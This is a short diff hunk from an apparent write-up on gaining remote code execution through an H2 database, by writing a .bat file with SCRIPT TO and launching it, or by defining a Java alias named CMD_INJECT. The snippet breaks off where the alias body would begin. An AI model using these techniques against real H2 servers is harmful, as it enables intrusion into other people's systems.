@@ -13,7 +13,7 @@ SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}'```
   '-> for old versions we open the .bat file with "org.h2.util.StartBrowser.openURL" and for the newest one "org.h2.tools.Server.openBrowser"
   '-> With this bat file we can perform remote code execution.
 
-~ In case of versions >(1.4), we just perform JAVA Code Execution through 'CREATE ALIAS' function:
+~ In case of versions >(1.4), we just need to write a JAVA Code Execution through 'CREATE ALIAS' function:
 ```
 
   '->  CREATE FORCE ALIAS CMD_INJECT AS $$
